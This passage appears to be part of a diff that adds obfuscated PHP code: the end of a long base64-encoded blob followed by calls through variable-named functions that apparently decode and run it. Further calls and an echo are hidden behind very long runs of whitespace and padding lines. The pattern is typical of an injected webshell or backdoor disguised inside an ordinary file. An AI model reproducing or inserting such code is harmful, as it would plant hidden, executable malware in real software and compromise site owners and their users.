qu3Jt8EiWSjg+e9Yjj8AJCuNcyBUP5xUdhberufbVnLuIF4Q5yXvU8uZcz+tpDnz0Lu8hXm8w7tTW2bsWy6S/tu2X5ZW/i/ynlNXQUJ9GWvP94/aRvOd8bb9HeWH+nvZvk1My9+8ooxLGnesJPdunn/UrUtzL+zeGvis19hMrifuUj9DfA0r2eOCYV7hF6NQaq49yi0LN6Wz/QyXek0x56plrvvdem3O58/5FvoYl4bdgye/hG8kY//t+YTwaomJfx49zuXubZCxSb5mpXeBKBxthfWeVtZrzfVtnemWLPL+hT1h8K8Uhel88mNQM8o3YqYErg7d41G+5q8wPNNsSVowvtQMdN/mF8x1fmQ+2iJUkh429X/nj+ZR8L0jfxc3egz7DvwcR+MPh77zROsDVXfrbFbX3YBwmf+PtQ/nH5Vzh5L2y36WHtFNVd8rnOnPG/iV5J6hClp4khsh9yz1HHSVw5oMXT1JWxFeTPk9WG3xJf7dK381+SZ9faKI6GIkNsj/FaEeiDjsmzLZ40RjxKn6enq5p9r50W8KbbUX7J+ovnCc81D3qS6K/T+byDW4821EvZBITjMbMQd7eLf/+6JyPerXFKfLKvWcJO6eucIxTh83Z2AIfg+2kskBOGKwnLN+nHgRwMyar9xfag2aoimr0l0d9KvQ38fZWXQ2dVvON/V2R2A4Iux9jl72nIoduaB3lGrRvfWbsHPq7JkmfXlprZe/UJjze6lf6HOtD6ND7DFn+uztaR+Gd/zlHvijS33Oo/ptCi6+ffvnhh//+H6r8yr7/Pf3pH798y+OFZz/y4N8OE/79E/3/p//Pp739dzv/Gv/dzrKu/14yrkTV//jlP1zUyVQ=';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
